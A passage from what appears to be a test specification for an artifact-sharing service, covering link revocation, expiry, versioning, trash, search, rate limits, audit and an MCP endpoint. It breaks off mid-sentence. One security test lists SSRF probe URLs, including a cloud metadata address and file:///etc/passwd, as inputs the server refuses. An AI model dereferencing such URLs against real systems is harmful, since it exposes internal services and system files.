*Integration.* Artifact with 2 live links and 1 grant. `DELETE /artifacts/{n}`. **Expect:** both
links have `revoked_at` set, all recipient sessions deleted, the grant `revoked_at` set, the
grantee's `?shared=true` no longer lists it, and every link is `410`. Then `POST
/artifacts/{n}/restore`. **Expect:** the artifact serves again to the owner; `share_link` rows
remain revoked; `share_grant` remains revoked; `GET /artifacts/{n}` shows `shareLinks: []`,
`grants: []`, `visibility: private`; the old link URLs are still `410`. A `link.revoke` /
`grant.revoke` audit row exists for each with `actor_type='user'`, and **no** `link.create` row
appears on restore. §5.11, §8.4.

**T-SHARE-12 — extending never shortens.** *Integration.* A link expiring in 10 d, extended by
`"7d"` → `expiresAt` becomes original + 7 d = 17 d out, **not** now + 7 d. Extending a link
expiring in 1 h by `"14d"` → 14 d + 1 h out. Extending past `SHARE_MAX_SHARE_TTL` measured from
creation → `422 ttl_too_long`. A `link.update` audit row with both old and new expiry in
`metadata`. §7.4.

**T-SHARE-13 — `maxViews` burns the link.** *Integration.* `max_views: 2`. Three distinct
viewer-days consume it. **Expect:** the third is `410`; the second still `200`; the counter
counts **distinct viewer-days**, not requests — a single viewer loading 40 assets increments it
once (asserted by loading a 40-file bundle and checking `view_count` moved by 1). See §14.24
ambiguity A4. §7.3, §10.6.

**T-SHARE-14 — grants.** *Integration.* `POST /artifacts/deck/grants {handle:"sarah"}` → `201`,
a `share_grant` row, `grant.create` audited. Sarah's `?shared=true` lists it with
`owner:{handle:"robert", isSelf:false}`. She reaches it at `/~robert/deck` signed in. She can
`GET` files/content and `POST copy`; she cannot `PATCH`, `DELETE`, `POST links`, `POST grants`,
`POST versions/{id}/restore`, or see anything else in Robert's space (`403 not_your_artifact` on
the ULID forms, `404` on name forms). `DELETE /grants/{id}` → her next request is `404`, with
the clock frozen and no cache flush. §7.7.

**T-SHARE-15 — grant edge cases.** *Integration.* Grant to a handle that does not exist →
`404 user_not_found`; to yourself → `409 cannot_grant_to_self`; twice → `409 grant_exists`;
re-granting after a revoke → succeeds with a new `grn_` ID; granting a trashed artifact →
`422 artifact_trashed`; granting with `tok_agent` → `403 insufficient_scope` naming
`share:create`. §7.10, §7.9.

**T-SHARE-16 — derived visibility.** *Integration.* Parameterised over all four combinations of
{live links: 0, 1} × {live grants: 0, 1}: `private`, `granted`, `shared`, and — with both —
`shared` (the widest wins, §7.8). Revoking the last link with a grant still live flips back to
`granted`. An **expired but not yet swept** link counts as **not live**, so visibility is
`private` — this is the case where the derived field and the raw row disagree, and the derived
value must follow the inline check, not `revoked_at`. §7.8, §7.5.

**T-SHARE-17 — the owner is notified whenever something becomes reachable.** *Integration.*
Creating a link with `settings.notifyOnShare` at its **default** → one `link_created` email
naming the artifact, the expiry in absolute UTC, and whether a password was set. Turning the
setting off suppresses it. The first-ever link created by a given token additionally fires
`first_link_by_token` (§10.4) even when `notifyOnShare` is off. §7.3, §10.8.

**T-SHARE-18 — negative trio for the sharing surface.** *Integration.* Permission: `tok_agent`
→ `403 insufficient_scope`; `user_c` on `user_b`'s artifact → `404`/`403 not_your_artifact`.
Limit: 21 links in an hour → `429`, `detail.bucket == "link_create"`, **and** an immediate owner
notification (§10.2.1); 61 grants in an hour → bucket `grant`. Malformed: `password: "short"` →
`422 password_too_short`; `password: 12345` (wrong type); `ttl: "1y"`; `maxViews: -1`;
`maxViews: "many"`; a 10 KB `label`. §14.1.3.

## 14.10 T-EXP — expiry, everywhere

**T-EXP-01 — expiry is enforced, not merely recorded.** *Integration.* Create a link with a
30-minute TTL. Assert `expires_at` is non-null and equals creation + 30 min. §7.1, P4.

**T-EXP-02 — a link is dead the second after expiry, before the sweep runs.** *e2e,
`@security`. **This is the test cited by §7.5.***
- **Pre:** a live link L on `postcal`, `expires_at = T`. A recipient has already fetched
  `/s/{t}/` and `/s/{t}/style.css`, so `sh:tok:{sha}`, `sh:res:*`, and `sh:man:*` are all warm.
  The worker is **not** running; the expiry sweep is invoked explicitly by tests only.
- **Steps:** Advance the injected clock to `T + 1 second`. Do **not** run the sweep. Do **not**
  flush Redis. Immediately request `/s/{t}/`, `/s/{t}/style.css`, `/s/{t}/img/chart.png`, and
  `POST /s/{t}/unlock` with the correct password.
- **Expect:** `410 link_expired` on the entry page; `404 not_found` on the two asset paths;
  `410` on `/unlock`. Then assert the enforcement is genuinely inline: `SELECT revoked_at FROM
  share_link WHERE id = …` **is still NULL** and the Redis key `sh:tok:{sha}` is **still
  present** with its cached value — the row says live, the cache says live, and the request is
  still refused, because `/internal/authorize` compares `expires_at` to the clock on every
  request (§7.5). Finally run the sweep and assert `revoked_at` is now set, recipient sessions
  are deleted, `link.expired` is audited with `actor_type='system'`, and a `link_ended` email
  fired — bookkeeping catching up to an enforcement that had already happened.

**T-EXP-03 — the sweep.** *Integration `@commit_required`.* Ten links, six past expiry. Run the
5-minute sweep. **Expect:** exactly six updated, `RETURNING` the six IDs; recipient sessions for
those six deleted; `sh:tok:` keys purged; six `link.expired` audit rows; six `link_ended` emails
and no seventh. Re-running is a no-op producing zero rows and zero emails. §7.5.

**T-EXP-04 — the 24-hour warning.** *Integration.* A link expiring in 23 h 50 m. Run the hourly
job. **Expect:** one `link_ending` email containing a one-click extend URL that, when followed
by the signed-in owner, extends the link and is single-use. Running the job again within the
same window sends **no** second email (idempotency asserted). A link expiring in 30 h gets
nothing. §7.5, §10.8.

**T-EXP-05 — links expiring within 48 h surface in the dashboard payload.** *Integration.*
`GET /api/v1/artifacts` and the dashboard's banner endpoint include links expiring within 48 h
and exclude those beyond. §7.5, §11.5.

**T-EXP-06 — artifact TTL moves the artifact to the trash.** *Integration.* `ttl: "30d"`. Advance
30 d + 1 min, run the 15-minute sweep. **Expect:** `trashed_at` set, **not** `deleted_at`; the
artifact appears in `?trashed=true`; it is restorable; `artifact.ttl_expired` audited; its
storage still counts against quota (§8.4); its links and grants are revoked exactly as a manual
trash would. Advance a further 30 d and run the nightly trash job → hard deleted. §8.5.

**T-EXP-07 — artifact TTL is enforced inline too.** *e2e.* Advance past `ttl_expires_at` without
running the sweep. **Expect:** `404` at the artifact URL for the owner and everyone else, with
`trashed_at` still NULL in the row. §8.5, §6.5.

**T-EXP-08 — TTL notification only when it matters.** *Integration.* An artifact with a TTL and a
live link, 24 h out → one `artifact_ttl_ending` email. An artifact with a TTL and no link or
grant → **no** email. Setting a TTL on an artifact that already has live links returns a
`ttl_with_live_links` warning in the response. §8.5.

**T-EXP-09 — a recipient session never outlives its link.** *Integration.* Link expiring in 3 h;
unlock. **Expect:** `recipient_session.expires_at == link.expires_at`, not now + 24 h. At
T+3h+1s the cookie is refused. §4.7.

**T-EXP-10 — upload session expiry.** Covered by T-POST-21; this case adds the boundary: at
`expires_at − 1 s` a `PUT` succeeds and at `expires_at + 1 s` it is `403
upload_signature_invalid`, and a commit at `+1 s` is `409 upload_session_expired`. §5.7.

**T-EXP-11 — invite expiry.** *Integration.* An invite at 7 d − 1 min accepts; at 7 d + 1 min →
`410 invite_expired` and the handle is released for reuse. §4.8.

**T-EXP-12 — token expiry.** *Integration.* A token with `expires_at` in the past →
`401 invalid_token`, identical body and timing to an unknown token (T-AUTH-07). §4.6.

**T-EXP-13 — WebAuthn challenge TTL.** *Integration.* A challenge used at 299 s succeeds; at
301 s the Redis key is gone and the finish is `401 webauthn_verification_failed`. §3.3.

## 14.11 T-VER — versions and reference counts

**T-VER-01 — version listing and diffing.** *Integration.* Five versions with known manifest
changes. **Expect:** `items` in descending `seq` with `isLive` true on exactly one,
`changes:{added,modified,removed}` computed against the **preceding** version and correct for
each — including a rename-shaped change (one removed, one added) and a content change at the
same path (one modified). The diff is cached 24 h; mutating a cached diff's inputs and
re-reading within the window returns the cached value, and after 24 h it recomputes. §8.2.

**T-VER-02 — restore carries content, not sharing.** *Integration.* Artifact at seq 3 with two
live links, one grant, a title, tags, a TTL, `pinned: true`, and `entryPath: /a.html`. Version 1
had `entryPath: /index.html` and a different file set. Restore version 1. **Expect:** a **new**
version at **seq 4** (history append-only); its manifest equals v1's exactly; `entry_path`
becomes `/index.html` (carried); **name, title, description, tags, TTL, and pinned are
unchanged**; **both links remain live with the same tokens and expiries and now serve v1's
content**; the grant remains live. Assert `share_link` rows were not touched at all (row
`updated`-free, no `link.*` audit rows). A `version.restore` audit row. §8.2.

**T-VER-03 — restore moves no bytes.** *Integration.* Measure disk usage and the `file` table
before and after a restore of a 40 MB version. **Expect:** identical byte count on disk, zero
new `file` rows, `ref_count` incremented once per `version_file` row created, and the call
completes in under 1 s (§14.20). §8.2.

**T-VER-04 — the live version cannot be deleted.** *Integration.* `DELETE
/artifacts/{n}/versions/{live}` → `409 version_is_live`, nothing changed. Deleting a non-live
version soft-deletes it (`deleted_at`), removes it from listings, makes preview `409
version_deleted`, and hard-deletes it after the trash window, at which point its exclusive files
become collectable. §8.2.

**T-VER-05 — version preview.** *Integration.* `/~/artifacts/{n}/versions/{id}/preview` streams
files **through the API** for the signed-in owner. **Expect:** `200` for the owner; `404` for a
grantee, a recipient, and a stranger; no public path ever mounts a non-live version (assert
`/{name}` and `/s/{t}/` always serve the live version even while a preview is open); no preview
token or per-version hostname exists in the URL space. §8.2.

**T-VER-06 — restore with a purged file.** *Integration.* Force-collect a file that only version
2 references (by purging every other referent), then restore version 2 → `422
restore_files_missing` naming the paths, nothing mutated. §8.9.

**T-VER-07 — retention pruning.** *Integration.* 30 versions, `keepLast:20`, `keepDays:365`,
`keepPinned:true`, `minimum:3`. Advance so 25 are older than 365 d, pin version 2. Run the
nightly prune. **Expect:** the 20 most recent kept, version 2 kept (pinned), the live version
kept regardless, and never fewer than 3 remaining under any setting combination — including the
adversarial config `keepLast:0, keepDays:0, keepPinned:false`, where `minimum:3` still holds and
the live version survives. §8.3.

**T-VER-08 — reference counts are exactly correct, always.** *Integration `@commit_required`,
the reconciliation test.* A scripted sequence of ~40 operations in one run: post, repost, post a
duplicate file under a second name, copy, restore a version, delete a version, trash, restore,
purge, prune, run collection, post again reusing a collected hash, bundle-upload, abandon a
session, expire it, and commit concurrently. **After every single step**, run a brute-force
reconciliation:

```sql
SELECT f.sha256, f.ref_count, (SELECT count(*) FROM version_file vf WHERE vf.sha256 = f.sha256)
FROM file f;
```

**Expect:** `ref_count` equals the counted rows for **every** file after **every** step — no
drift, not even transiently observable from another connection after commit. Additionally assert
that the set of blobs on disk equals the set of `file` rows, and that every `version_file.sha256`
has a `file` row and a blob. §3.6.

**T-VER-09 — a drifted counter never deletes live data.** *Integration `@commit_required`.*
Corrupt `ref_count` to `0` and `-5` for two files that **are** referenced, and to `7` for a file
that is not. Backdate `last_ref_at` past 24 h. Run collection. **Expect:** the two referenced
files survive — the `NOT EXISTS (SELECT 1 FROM version_file …)` clause is authoritative (§3.6) —
and are still served; the over-counted unreferenced file is **not** collected (its `ref_count >
0` excludes it), which the test records as expected conservative behaviour and which
`sharectl recompute-refs` fixes. §3.6, §14.24 ambiguity A8.

**T-VER-10 — collection respects the grace window and the lock.** *Integration
`@commit_required`.* An unreferenced file with `last_ref_at` 23 h ago is **not** collected; at
25 h it is. A file that an open upload session is about to reference is not collected even at
25 h (the session's pending set is checked, and the row lock plus grace window make the race
impossible — asserted by running collection concurrently with a commit 20 times and checking no
commit ever fails with a missing file). Collection is bounded at 5,000 per run and logs a
summary; a sixth-thousandth file waits for the next run. §3.6.

**T-VER-11 — pinning.** *Integration.* `POST /versions/{id}/pin` and unpin; pinned versions
survive pruning; pinning the live version is allowed and is a no-op for retention. `version.pin`
audited. §8.2, §8.3.

**T-VER-12 — negative trio for the version surface.** *Integration.* Permission: `tok_ro` on
`restore`/`pin`/`DELETE` → `403 insufficient_scope`; another user's version ULID →
`404 version_not_found`. Limit: restoring in a loop counts against the `post` bucket → `429`.
Malformed: a `versionId` with the wrong prefix (`art_…`), a non-ULID, a version belonging to a
different artifact → `404 version_not_found` in every case (never a cross-artifact restore).
§8.9.

## 14.12 T-TRASH — trash, restore, purge

**T-TRASH-01 — trashing.** *Integration.* `DELETE /artifacts/postcal`. **Expect:** `trashed_at`
set, `deleted_at` NULL; the URL `404`s for everyone including the owner; absent from
`GET /artifacts`, from search, and from `?shared=true` for grantees; present only in
`?trashed=true`; `artifact.trash` audited. §8.4.

**T-TRASH-02 — the name is held while trashed.** *Integration.* After trashing `postcal`, posting
a new artifact named `postcal` → `409 name_taken`, with a message that says the name is in the
trash (asserted for the code, not the wording). Renaming another artifact to `postcal` → `409
name_taken`. After purging or after the 30-day empty, the name becomes available and a post
succeeds. §5.3, §8.4.

**T-TRASH-03 — restore.** *Integration.* `POST /artifacts/postcal/restore` → `trashed_at` NULL,
the URL serves again, all versions intact, `artifact.restore` audited. Restoring something not
trashed → `409 artifact_not_trashed`. Restoring when the name was somehow reused → `409
name_taken` (reachable only after a purge race; the test constructs it directly). §8.4, §8.9.

**T-TRASH-04 — trashed storage still counts.** *Integration.* Trash an artifact; assert
`app_user.storage_bytes` is unchanged after the dirty-set drain, and that the trash screen's
figure equals the summed unique bytes of trashed artifacts. §8.4.

**T-TRASH-05 — the 30-day empty.** *Integration `@commit_required`.* Trash at T. Run the nightly
job at T+29 d → nothing. At T+30 d + 1 min → rows hard-deleted, `version_file` gone, ref counts
dropped, `system.trash_empty` audited. Run collection the next night → exclusive bytes gone. The
whole cycle completes within 31 days, which the test asserts as a date arithmetic property.
§3.6, §8.4.

**T-TRASH-06 — purge needs the separate scope.** *Integration.* `DELETE /artifacts/{n}?purge=true`
with `tok_agent` → `403 insufficient_scope`, `detail.scope == "artifacts:delete"`; with
`tok_deleter` → success, skipping the trash entirely, `artifact.purge` audited. §8.4, §4.6.1.

**T-TRASH-07 — an agent with default scopes provably cannot permanently delete anything.**
*Integration, `@security`.* With `tok_agent`, attempt permanent destruction by **every** route
the API offers: `?purge=true`; `DELETE` twice in a row on the same artifact; `DELETE` on an
already-trashed artifact; `DELETE /versions/{id}` on every version including the live one; a
`PATCH` setting `ttl` to a past timestamp; a `PATCH` setting `ttl: "0s"`; posting 200 versions to
force retention pruning below the floor; trashing and immediately restoring in a loop; setting
`deleted_at` via any body field; and `DELETE /api/v1/files/{sha}` if such a route exists (it must
not — asserted against the route table). **Expect:** after the whole sweep, every artifact is
either live or restorable from the trash, every `file` row still exists, and the byte count on
disk is unchanged. The only state an agent-default token can reach is "in the trash". §8.4,
§7.9.

**T-TRASH-08 — purge is the P8 path.** Cross-reference: T-PRIV-08 is the authoritative case.
This entry exists so the trash area's coverage report names it. §3.6.

**T-TRASH-09 — negative trio for the trash surface.** *Integration.* Permission: another user's
artifact → `404`. Limit: purging in a loop counts against the `api` bucket. Malformed:
`?purge=yes`, `?purge=1`, `?purge=TRUE` → assert the parser accepts exactly `true`/`false` and
`422`s otherwise, because a lenient boolean parser here is a permanent-deletion footgun. §14.1.3.

## 14.13 T-SEARCH — metadata-only search

**T-SEARCH-01 — content is unfindable, proven by construction.** *Integration, `@security`.
Verifies P5, §8.7.*
- **Pre:** post four artifacts with **no** title and no tags: a PDF whose text contains
  `zygomatic-tulip-oscilloscope`, an HTML file containing that phrase in a `<h1>`, a `.txt`
  containing it, and a `.docx` containing it. Also post one artifact **named**
  `zygomatic-tulip` for a positive control.
- **Steps:** `GET /api/v1/artifacts?q=` for each of: the full phrase, each word, a two-word
  prefix, a misspelling, and an uppercase variant. Also run the same through MCP `share_list`,
  the CLI `share search`, and the dashboard search endpoint.
- **Expect:** the four content-bearing artifacts are returned by **none** of the queries through
  **any** surface. The positive control is returned for `zygomatic`, `zygomatic-tulip`,
  `zygomatik` (trigram), and `ZYGOMATIC`. Additionally assert no table, index, or column in the
  schema stores artifact text — enumerate `information_schema.columns` and assert none is a
  `tsvector`, and that `pg_trgm` indexes exist only on `artifact.name` and `artifact.title`.

**T-SEARCH-02 — `q` matches name, title, description, and tags.** *Integration.* Four artifacts,
each carrying the token `marmot` in exactly one of those four fields. **Expect:** all four
returned for `q=marmot`; an artifact with `marmot` only in a filename is not. §8.7.

**T-SEARCH-03 — ranking order.** *Integration.* Seed: exact name `report`, name prefix
`report-q3`, name trigram `reprot-old`, title match, description match, tag match. **Expect:**
result order exactly: exact name, name prefix, name trigram, title, description — with the tag
match boosted above a description-only match at equal similarity. Assert the ordering is stable
across runs and is produced by a single SQL expression (statement-log assertion: one query, no
application-side re-sort). §8.7.

**T-SEARCH-04 — filters.** *Integration.* Parameterised over `tag` (repeatable, ANDed), `kind`
(all six values), `owner`, `createdBefore/After`, `updatedBefore/After`, `hasLink`, `token`,
`trashed`, `shared`, `pinned`, and all five `sort` values. Each asserts the exact expected ID
set. An unknown filter or sort → `422 invalid_filter`. `owner=sarah` from `user_c` returns only
artifacts granted to `user_c`, never Sarah's private ones. §8.7.

**T-SEARCH-05 — search is scoped, with no instance-wide escape.** *Integration, `@security`.*
As the **root** user, search for a term that matches only `user_b`'s private artifact, with and
without `scope=instance`, `owner=sarah`, `all=true`, and every other parameter combination.
**Expect:** never returned. Root has no cross-space search — asserted against the route's
parameter model so adding one fails the test. §8.7, P7.

**T-SEARCH-06 — pagination.** *Integration.* 250 artifacts. `limit=50` walks the whole set with
`nextCursor`, `hasMore` correct, no duplicates, no omissions, stable under a concurrent insert
(the new item appears at most once). `limit=201` → `422`; `limit=0` → `422`; an `offset`
parameter → `422 invalid_filter` (offsets are unsupported everywhere, §5.1.2); a cursor from a
different user → returns that user's own first page, never a cross-space leak. §5.1.2.

**T-SEARCH-07 — trashed and shared switches.** *Integration.* `?trashed=true` returns only
trashed artifacts and never mixes them into the default listing; `?shared=true` returns only
granted-to-me and marks `owner.isSelf: false`. Combining both → `422 invalid_filter`. §8.7.

**T-SEARCH-08 — negative trio for search.** *Integration.* Permission: unauthenticated → `401`.
Limit: 301 searches in an hour → `429`, bucket `search`. Malformed: `q` of 10 KB, `kind=widget`,
`sort=random`, `createdAfter=notadate`, `tag` with 40 repetitions → `422` with
`detail.fields`. §10.2.1.

## 14.14 T-LIMIT — rate limits, quotas, ceilings

**T-LIMIT-01 — every registered bucket has a test.** *Unit.* Import
`share.limits.BUCKETS` — the single registry every limiter reads — and assert its key set equals
the union of §10.2.1, §10.2.2, and §10.2.3 exactly (22 names). Then walk the test suite for the
`@bucket("name")` marker and assert every registered bucket is claimed by at least one test.
**Adding a bucket without a test fails the build; removing one from the spec without removing it
from the registry also fails.** The mapping is:

| Bucket | Test | Bucket | Test |
| --- | --- | --- | --- |
| `api` | T-LIMIT-04 | `webauthn_begin` | T-AUTH-19 |
| `api_ip` | T-LIMIT-04 | `webauthn_finish` | T-AUTH-19 |
| `post` | T-LIMIT-05 | `token_auth_fail` | T-LIMIT-13 |
| `post_token` | T-LIMIT-05 | `device_start` | T-LIMIT-23 |
| `upload` | T-LIMIT-06 | `device_poll` | T-AUTH-12 |
| `bundle` | T-LIMIT-07 | `recovery_use` | T-AUTH-14 |
| `link_create` | T-LIMIT-08 | `recovery_use_ip` | T-AUTH-14 |
| `grant` | T-LIMIT-09 | `link_password` | T-LIMIT-14 |
| `search` | T-LIMIT-10 | `link_password_link` | T-LIMIT-14 |
| `invite` | T-LIMIT-11 | `serve_ip` | T-LIMIT-15 |
| `copy` | T-LIMIT-12 | `serve_link` | T-LIMIT-16 |

**T-LIMIT-02 — token-bucket arithmetic.** *Unit.* For a bucket of 600/min with burst 100: 100
immediate requests succeed; the 101st in the same instant is refused; after 100 ms exactly 1
token has refilled (600/min = 10/s) and one request succeeds; a sustained 700/min is refused
~100 times per minute while a sustained 599/min never is. Assert continuous refill, not
fixed-window resets, by showing no cliff at the minute boundary. Clock-driven, no sleeps. §10.2.

**T-LIMIT-03 — every `429` carries its metadata.** *Integration.* Trip each of the 22 buckets and
assert on **every** response: status `429`, `code == "rate_limited"`, `detail.bucket` equal to
the registry name, and headers `Retry-After` (integer seconds, > 0), `X-RateLimit-Limit`,
`X-RateLimit-Remaining` (`0`), `X-RateLimit-Reset` (a future epoch second). Sleeping
`Retry-After` seconds on the injected clock makes the next request succeed. §10.2.

**T-LIMIT-04 — `api` and `api_ip`.** *Integration.* 601 API calls in a minute from one token →
`429` bucket `api`. Then, from one IP with **six different tokens**, 1,201 calls → `429` bucket
`api_ip` while each individual token is still under its own limit — proving the two buckets are
independent and both enforced. §10.2.1.

**T-LIMIT-05 — `post` and `post_token`.** *Integration.* 121 declares from one token → bucket
`post_token`. Then from three tokens of one user, 241 declares in an hour → bucket `post` while
no single token has exceeded 120. §10.2.1.

**T-LIMIT-06 — `upload` concurrency.** *Integration.* 17 simultaneous `PUT`s on one session →
the 17th is `429 too_many_uploads` with `Retry-After`; completing one frees a slot; 16 in
parallel across **two** sessions of the same user both succeed (the subject is the session).
§5.4, §10.2.1.

**T-LIMIT-07 — `bundle`.** 121 bundle uploads in an hour → `429` bucket `bundle`. §10.2.1.

**T-LIMIT-08 — `link_create` and its alarm.** *Integration.* 21 links in an hour → the 21st is
`429` bucket `link_create`; **exhausting the bucket fires an immediate owner notification**
(§10.2.1) — assert exactly one `anomaly_link_rate` email. Independently, the §10.4 threshold of
>5 links in an hour fires its own notification well before the limit is reached, so the test
asserts the first alert lands at link 6 and the `429` at link 21. §10.2.1, §10.4.

**T-LIMIT-09 — `grant`.** 61 grants in an hour → `429` bucket `grant`. §10.2.1.

**T-LIMIT-10 — `search`.** 301 searches in an hour → `429` bucket `search`. §10.2.1.

**T-LIMIT-11 — `invite`.** 11 invites in a day → `429` bucket `invite`. §10.2.1.

**T-LIMIT-12 — `copy`.** 121 copies in an hour → `429` bucket `copy`. §10.2.1.

**T-LIMIT-13 — `token_auth_fail` escalates.** *Integration.* 30 bad-token requests from one IP in
an hour succeed in returning `401`; the 31st is `429` bucket `token_auth_fail`; thereafter the
bucket permits **1 per minute** — assert a request at +30 s is `429` and at +61 s is `401`. A
**valid** token from the same IP is unaffected throughout, so an attacker cannot lock out a
legitimate agent sharing an egress IP. Repeated failures produce an hourly-at-most
`repeated_auth_failures` email. §10.2.2, §10.8.

**T-LIMIT-14 — share-link password brute force.** *Integration.* 11 wrong passwords for one link
from one IP in an hour → `429` bucket `link_password`. Then from **12 different IPs**, 50
attempts against one link → the 51st is `429` bucket `link_password_link`, which is the ceiling
that makes a distributed attack on a 24-bit generated password infeasible. **Exhausting
`link_password_link` for the first time emails the owner** — assert exactly one such email, and
that a second exhaustion the same day does not spam. A correct password during throttling is
still refused with `429`, not `303`. §10.2.2, §7.4.

**T-LIMIT-15 — `serve_ip`, and the owner's ten-times allowance.** *e2e.* 601 requests to one
artifact from one anonymous IP in a minute → `429` bucket `serve_ip`. The signed-in **owner**
from the same IP reaches 6,000 before throttling. A single page load fetching 60 assets never
trips anything. The bucket is keyed on **IP + artifact**, so hammering artifact A does not
throttle artifact B from the same IP. §10.2.3.

**T-LIMIT-16 — `serve_link`.** *e2e.* 3,001 requests through one share link in an hour → `429`
bucket `serve_link`, independent of source IP, which is what bounds a leaked link's blast
radius. §10.2.3.

**T-LIMIT-17 — the five storage ceilings.** *Integration.* Parameterised over §10.3: per-user
quota (declare and commit — T-POST-08, T-POST-09), per version (`413 artifact_too_large`), per
file (`413 file_too_large`), files per version (`413 too_many_files`), bundle compressed and
expanded. Each asserts the code, the `detail` payload, and that the check happens at the stage
§10.3's "Checked at" column names — verified by asserting **no bytes were written** for
declare-time failures. §10.3.

**T-LIMIT-18 — quota warnings.** *Integration.* Cross 80% → one `quota_warning` email naming the
percentage; cross 81% the same day → **no** second email (at most daily); cross 95% → a new
email (a different threshold, not a repeat); the next day at 96% → one more. §10.3, §10.8.

**T-LIMIT-19 — disk full.** *Integration.* Simulate the file root's device reporting no free
space at the declare check. **Expect:** `507 disk_full` on posting; `GET` on artifacts still
`200`; share links still resolve; `DELETE` still works. A `disk_high` email fires at 85%. §10.9,
§10.8.

**T-LIMIT-20 — body and URL ceilings.** *Integration.* A 10 MB + 1 byte JSON body → `413`; a
file `PUT` over `SHARE_MAX_FILE_BYTES` cut mid-stream with nothing left in tmp; an 8 KB + 1 URL;
a request that hangs past the 30 s timeout (and an upload correctly allowed 3,600 s). §5.1.4.

**T-LIMIT-21 — anomaly detection warns and never blocks.** *Integration.* Drive each of the
eight §10.4 signals to threshold: 6 links in an hour by one token; a token's first-ever link; 11
GB posted by one token in an hour; 101 artifacts created; 51 artifacts trashed; a token used
from a new source IP; a recovery code used; a counter regression. **Expect:** for each, one
email of the matching template and a dashboard banner payload, and — critically — **the
operation itself succeeds every time**; nothing is blocked, no request returns a different
status because an anomaly fired. Sub-threshold activity produces no email. §10.4.

**T-LIMIT-22 — limits are per-subject.** *Integration.* For each bucket, exhaust it for subject
A and assert subject B is unaffected, where the subject is whatever §10.2 names (token, user,
IP, session, link, email, device code). This is one parameterised test over the registry and it
is how a mis-keyed limiter is caught. §10.2.

**T-LIMIT-23 — `device_start`.** 11 device-code starts from one IP in an hour → `429` bucket
`device_start`. §10.2.2.

## 14.15 T-AUDIT — the audit log, views, and notifications

**T-AUDIT-01 — every recorded action fires.** *Integration.* One test per action in §10.7's
table (49 actions). Each performs the operation and asserts exactly one matching `audit_event`
with the correct `actor_type`, `actor_token_id` where applicable, non-null `ip`, `user_agent`,
`target_type`, `target_id`, and a `target_label` that is **denormalised** — assert it survives by
purging the target and re-reading the event. A completeness assertion fails if the application
emits an action string not in §10.7's list. §10.7.

**T-AUDIT-02 — audit reads and filters.** *Integration.* `action=link.` matches every sharing
action by prefix; `action=link.create` matches exactly; `actorType`, `tokenId`, `targetId`, `ip`,
`from`/`to`, and free text on `target_label` all filter correctly and compose. A user sees only
their own events. `scope=instance` works for the root user and is `403 insufficient_scope` for
anyone else. §10.7.

**T-AUDIT-03 — export.** *Integration.* `GET /api/v1/audit/export?format=ndjson` streams one
JSON object per line, chronological, matching the filtered query exactly, with no secret in any
field. §10.7.

**T-AUDIT-04 — view counting writes no raw row.** Cross-reference T-PRIV-06. This case adds the
aggregation: 40 requests from 3 addresses across owner, grant, and link sources in one day →
after the 60 s flush, `view_daily` has exactly three rows (one per `source`), `views` summing to
40, `viewers` from the HLL within ±10% of 3, and `bytes_served` equal to the actual sum. No row
for a request that returned `404` or `401`. §10.6, §3.8.

**T-AUDIT-05 — view rollups roll over at UTC midnight.** *Integration.* Requests at 23:59 and
00:01 land in different `day` rows; the HLL key for the old day retains a 40-day TTL. §3.8.

**T-AUDIT-06 — artifact activity feed.** *Integration.* `GET /artifacts/{n}/activity` merges
audit events and view rollups in reverse chronological order, showing posted, overwritten,
renamed, shared, link created and revoked, granted, copied, and "viewed *n* times on *date* via
*link label*". Assert **no** entry contains an identity, an address, or anything derived from
one. §8.8.

**T-AUDIT-07 — notification defaults and toggles.** *Integration.* For each row of §10.8, assert
the default state, that toggling the user setting takes effect, and that
`recovery_used` and `counter_regressed` **cannot** be disabled — setting them false and firing
the trigger still sends. §10.8.

**T-AUDIT-08 — one action, one email.** *Integration.* Perform a link creation that satisfies
several notification triggers at once (first link by this token, `notifyOnShare` on, anomaly
threshold reached). Assert the exact set of templates that fire and that no template fires
twice. A notification storm is a failure. §10.8.

**T-AUDIT-09 — `audit-seal` and `audit-verify`.** *Integration.* Enable sealing; run
`sharectl audit-seal` for a day; assert an append-only file outside the database holds a
SHA-256 over the day's ordered rows. `sharectl audit-verify` passes. Mutate one row directly as
a superuser and re-verify → fails, naming the day. Off by default (asserted). §10.7.

**T-AUDIT-10 — negative trio for the audit surface.** *Integration.* Permission: `tok_agent`
reading `/api/v1/audit` → `403 insufficient_scope` naming `account:read`; another user's
`targetId` returns no rows rather than `403`. Limit: `limit=201` → `422`. Malformed:
`from` after `to`, `format=xml`, `action` of 500 chars. §14.1.3.

## 14.16 T-MCP — the remote MCP endpoint

**T-MCP-01 — transport and handshake.** *e2e.* `POST /mcp` speaks streamable HTTP per the
current MCP specification: `initialize` returns server info and capabilities; `tools/list`
returns exactly the 14 tools of §9.3 with JSON Schemas for their arguments; SSE carries
server-to-client messages. A request without `Authorization` → a structured error carrying the
device-code instructions of §4.6.2 (`deviceCode`, `userCode`, `verifyUrl`) so an agent can walk
its human through setup. §9.2.

**T-MCP-02 — tool-level parity with the API.** *Integration.* For each of the 14 tools, execute
the tool and the equivalent HTTP call with equivalent arguments against identical starting
state, and assert the **resulting database and filesystem state is identical** (schema-aware
diff, ignoring IDs and timestamps). A capability present in one surface and absent from the
other fails this test — that is the §9.1 "neither has a capability the other lacks" claim made
checkable. §9.1, §9.3.

**T-MCP-03 — scopes apply identically over MCP.** *Integration.* `share_create_link` and
`share_grant` with `tok_agent` → a tool error carrying `insufficient_scope` and naming
`share:create`, **not** a transport error and not a silent empty result. Every scope-gated tool
is parameterised. §7.9, §4.6.1.

**T-MCP-04 — `share_post` takes content, not paths.** *Integration.* Inline text; base64 binary
at 8 MB (succeeds) and at 8 MB + 1 (a tool error naming `share_post_from_urls` and the CLI as
the alternative, per §9.3, rather than an opaque failure). A `path` argument pointing at a local
file is rejected — the schema has no such field. §9.3.

**T-MCP-05 — `share_post_from_urls` never makes the server fetch.** *Integration, `@security`.*
Per the resolution in §14.24 A9, the tool returns a declare response and signed upload URLs and
the **agent** dereferences the caller-supplied URLs. Assert with an outbound-socket recorder on
the API process that a `share_post_from_urls` call produces **zero** outbound connections from
the server, and specifically that URLs of the form `http://169.254.169.254/…`,
`http://127.0.0.1:5432/`, `file:///etc/passwd`, and `http://[::1]:6379/` are never dereferenced
by the API — they are passed back to the agent untouched. This is the test that keeps §2.9's
"no SSRF surface at all" literally true.

**T-MCP-06 — tool annotations.** *Integration.* `share_create_link` and `share_grant` are marked
as having external effects; `share_delete` is destructive-but-reversible; `share_post` is
idempotent-by-name. Assert the annotation fields are present in `tools/list`. §9.3.

**T-MCP-07 — tool descriptions carry the privacy facts.** *Integration.* Assert
`share_post`'s description states, in its first sentence, that posting does not make anything
